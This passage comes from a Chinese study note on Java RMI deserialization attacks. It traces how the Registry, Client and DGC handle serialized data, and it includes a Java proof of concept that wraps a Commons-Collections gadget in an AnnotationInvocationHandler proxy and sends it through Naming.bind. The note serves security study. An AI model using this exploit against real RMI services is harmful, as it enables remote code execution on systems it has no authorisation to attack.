![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708066534006-bb12a8b1-3474-452b-84c5-e1fde3cb4ed0.png#averageHue=%232e333d&clientId=u1d7260be-9af7-4&from=paste&height=250&id=uf0b0aa4b&originHeight=375&originWidth=1578&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=169299&status=done&style=none&taskId=u7050c684-d516-4c90-972d-b326a2063d3&title=&width=1052)
那么这里的反序列化的啥呢？是我们 lookup 参数中传入的指定远程对象的名称
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708066794057-47075f2a-87f4-44f8-90ae-3b42bf3c35eb.png#averageHue=%23343b47&clientId=u1d7260be-9af7-4&from=paste&height=23&id=u04d73b73&originHeight=34&originWidth=1002&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18150&status=done&style=none&taskId=u73224685-92ec-4793-a258-3a99501d506&title=&width=668)
就比如说这里的 Hello
那我们可以将序列化数据传入 lookup 的参数，只需注意这里必须是字符串参数才能接受

#### 1x02 Server 攻击 Registry
Server 端与注册中心有很多交互的可能，bind rebind 等，回顾一下服务端对注册中心交互的流程，获取到注册中心对象，创建了 Stub 动态代理对象，给 Registry 端发送了信息，新线程开启，并且开始调入 UnicastServerRef 的 dispatch 方法，又由于此时是在注册中心端处理的逻辑，进入 olddispatch，调用 RegistryImpl_Skel 的 dispatch （可以往 2-2-0x01 复习一下流程）
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708070621304-e585564b-38d0-4dad-a0f6-701a001e28b0.png#averageHue=%232e333c&clientId=u1d7260be-9af7-4&from=paste&height=399&id=u85181f94&originHeight=599&originWidth=1494&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=228119&status=done&style=none&taskId=u2f9c63e2-c9d3-436a-9b1a-6312da3c6be&title=&width=996)
有两处的反序列化操作，一个是绑定的键----var7，一个是绑定的我们传入的远程对象，第一个是 String 类型，没有利用可能，只能看第二个参数的反序列化，必须继承自 Remote 接口，之后就可以直接打 CC 等
实现的话我们直接用 AnnotationInvocationHandler 来代理了 Remote 接口  即可
代码实现可以参考如下
```java
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.util.HashMap;
import  java.rmi.registry.*;


public class POCtest {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Registry registry= (Registry) LocateRegistry.getRegistry("localhost",1099);
        Class<?> c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor=c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        HashMap<String,Object> map=new HashMap<>();
        map.put("a",new EvilClass().getEvil());

        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,map);
        Remote remote= (Remote)  Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Remote.class},invocationHandler);

        Naming.bind("a",remote);
    }
}
```
这里的获取 CC6 的 hashmap 是通过new EvilClass().getEvil()实现的，与上面客户端攻击 Registry 的获取恶意对象是一样的代码，这里的处理方式不同，因为我们传入的恶意类必须是  Remote 类型  ，那就靠 AnnotationInvocationHandler  来 代理 Remote 接口满足要求
然后就是把申请完代理类之后的恶意类传入 bind 的第二个参数即可
实际上，当我们在 RegistryImpl_Skel 中查看每个方法的处理逻辑，不止 bind 方法一处直接 readObject 了，包括 bind rebind 等等方法的攻击方式都是大同小异的
**请注意：攻击 Registry 端是存在 JDK 版本限制的，这里可以去看看白日梦组长 RMI 的视频，讲的很详细**

### 0x03 攻击对象为 Client
我个人理解，常用于反制手段，因为刚才我们上面对于 Registry 端或者 Server 端都是首先考虑 Client 端发起攻击，也确实符合逻辑和实际情况，那既然三者之间的信息传输都是通过序列化和反序列化实现的，那就存在互相攻击的可能，Client 端同样
之前只提到过一点，就是客户端远程调用之后，服务端将序列化结果给传输到 Client 端的 Stub，然后进行反序列化进行结果的提取
具体调用逻辑与之前分析的相同，因为是动态代理类，直接进 Handler 的 invokeRemoteMethod 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708094623924-f80c3a4b-537f-40e5-8980-4780630cd525.png#averageHue=%23393e4a&clientId=u1d7260be-9af7-4&from=paste&height=334&id=ub445ccf0&originHeight=501&originWidth=1836&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=283649&status=done&style=none&taskId=u8e1337df-9ee4-41ca-b721-5a1525bcd24&title=&width=1224)
然后进 UnicastRef 的 invoke 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708094673065-5ce2c2c9-ce35-40d6-9bda-37bd8c21889e.png#averageHue=%232f343c&clientId=u1d7260be-9af7-4&from=paste&height=328&id=u119fe473&originHeight=492&originWidth=1932&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=256254&status=done&style=none&taskId=ufdca62d2-f5c0-47a3-ab3b-7cfc9666abe&title=&width=1288)
将序列化数据传输给服务端经过处理后，会接受其结果，然后 UnmarShalValue 走一遍反序列化其结果
实现起来其实不太现实，一般情况要打 Client 也是将其看作 Server 端镜像着打，那么攻击方式也就是 Server 端攻击一样了

### 0x04 攻击对象为 DGC 
DGC 是什么呢？中文翻译为分布式垃圾回收-- Distributed Garbage Collection  ，之前确实遇到过 DGCImpl 的创建过程，但是我们那个时候没有跟进流程，那他具体是用来干什么的呢？当我们 Server 端给 Client 返回一个远程对象供使用的时候，他会跟踪这个远程对象的调用，如果这个远程对象没有进一步的被调用，那么 Server 端 将会启用垃圾回收远程对象，每开启一个 RMI 服务，一定会伴随着 DGC 服务端的启动
我们看看具体的实现功能类和接口
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708139953489-b6e80210-aa83-46e5-9462-e63c1374bee9.png#averageHue=%232d323a&clientId=u3bd86663-b765-4&from=paste&height=405&id=ua6f6515e&originHeight=607&originWidth=2432&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=359418&status=done&style=none&taskId=u9c2624ea-7d66-4021-92af-03a315a0d72&title=&width=1621.3333333333333)
首先是` java.rmi.dgc.DGC` 接口,他只有两个方法，dirty 与 clean 方法

- 当客户端使用 Server 端的远程对象的时候，我们使用 dirty 来注册一个
- 当客户端不再使用远程对象时，就会调用 clean 来清除这个远程对象


他有两个实现类，一个是 DGCImpl，一个 DGCImpl_Stub
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708140177225-b979575d-75df-4dae-af67-265714c44b94.png#averageHue=%2341506c&clientId=u3bd86663-b765-4&from=paste&height=94&id=wzTbI&originHeight=141&originWidth=737&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41116&status=done&style=none&taskId=u91294fb2-615c-4bf1-8386-de89d762069&title=&width=491.3333333333333)
这里可能查找出来只有这两个，但其实还有一个 DGCImpl_Skel
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708140328881-e7d5236d-be77-435e-ab94-49ebefa0e2b4.png#averageHue=%232e343e&clientId=u3bd86663-b765-4&from=paste&height=311&id=u30b7c2dc&originHeight=466&originWidth=2537&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=269645&status=done&style=none&taskId=uae295d51-30fa-47dd-b804-505a52f206a&title=&width=1691.3333333333333)
它并没有继承自 DGC 这个接口，而是实现自 Skelton 接口
那 DGC 是什么时候创建的呢？
服务端在创建远程对象的时候，流程走到创建完集成类 UnicastServerRef 之后，开始调用它的 exportObject 方法，一直走到 TCPTransport 的 exportObject 方法这里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708143086595-51862f68-292e-4a63-8cb0-027cd3e08efe.png#averageHue=%23373c47&clientId=u3bd86663-b765-4&from=paste&height=283&id=uc3297a52&originHeight=424&originWidth=1549&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=168333&status=done&style=none&taskId=u7fe22739-be50-45bc-8b9e-ba1a160ba0b&title=&width=1032.6666666666667)
前面的流程就不讲了，看 try 块中的 `super.exportObject `方法
跟进![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708143285289-31dedcf6-67d8-4612-90fc-17ba12428a4c.png#averageHue=%23303844&clientId=u3bd86663-b765-4&from=paste&height=137&id=ua3c19c97&originHeight=206&originWidth=1145&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=69781&status=done&style=none&taskId=u1494c931-063e-41ae-9fcc-dfe66d50027&title=&width=763.3333333333334)
上面 setExportedTransport 就不看了，跟进到 putTarget 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708143275324-48fddf2d-cd09-45be-9f2a-24f5738e469c.png#averageHue=%23454a5a&clientId=u3bd86663-b765-4&from=paste&height=168&id=uc0795e07&originHeight=252&originWidth=1725&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=151357&status=done&style=none&taskId=ufbf825af-efb6-496c-aadb-d851621d309&title=&width=1150)
这里有一个 if 判断的内容，调用了 DGCImpl 的 dgclog 静态变量，之前有了解过，当调用一个类的静态变量时，他会自动完成类的实例化，我们跟进，实例化就不看了，当实例化完成时肯定会调用它的静态代码区
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708143624201-7d5f0c25-fcf6-4b55-a555-18ead52e1f61.png#averageHue=%232e343d&clientId=u3bd86663-b765-4&from=paste&height=675&id=uf453b64a&originHeight=1013&originWidth=1697&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=535823&status=done&style=none&taskId=udf885504-10ec-40ed-b0c2-8b8fe7ad9d2&title=&width=1131.3333333333333)
这里的创建逻辑有点像注册中心，不仅会创建动态代理的 Stub，还会 set 完 Skel，最后将代理类封装起来成为 Target 类，然后 put 进 ObjectTable 的 hash 键值对表
然后再看看具体的Skel
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708144202237-679b4dd2-de33-437f-849a-b2856ba6eb0b.png#averageHue=%232b3239&clientId=u3bd86663-b765-4&from=paste&height=161&id=udfd511f3&originHeight=242&originWidth=658&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57484&status=done&style=none&taskId=u60de1c85-c197-44d2-abef-9461f1c9fe3&title=&width=438.6666666666667)
重点关注 dispatch
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708144177440-56bd6cc4-1456-4b34-b9a5-80a6318fb173.png#averageHue=%232e333c&clientId=u3bd86663-b765-4&from=paste&height=698&id=uc2689193&originHeight=1047&originWidth=1124&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=317719&status=done&style=none&taskId=u90639b13-5ff4-44ba-b060-7a3a40d6cd6&title=&width=749.3333333333334)
两个 case，一个是 clean，一个是 dirty，两者的作用我们上面已经提到了，我们只看关于两者是否存在可攻击点

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708147792089-6cfb9ad8-f0ed-4c52-802d-9a1e6953a929.png#averageHue=%2330353f&clientId=u3bd86663-b765-4&from=paste&height=226&id=u877bd477&originHeight=339&originWidth=805&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88694&status=done&style=none&taskId=u60371661-b5fc-4b76-8ca4-accb6d60335&title=&width=536.6666666666666)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1708147863525-620be98f-8b3b-4710-be25-8d38afc1bbb2.png#averageHue=%232f353e&clientId=u3bd86663-b765-4&from=paste&height=193&id=ua1e6a79b&originHeight=290&originWidth=853&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=70716&status=done&style=none&taskId=u1db255b4-6385-4664-8793-91793e2906e&title=&width=568.6666666666666)
两者其实都存在被攻击的可能



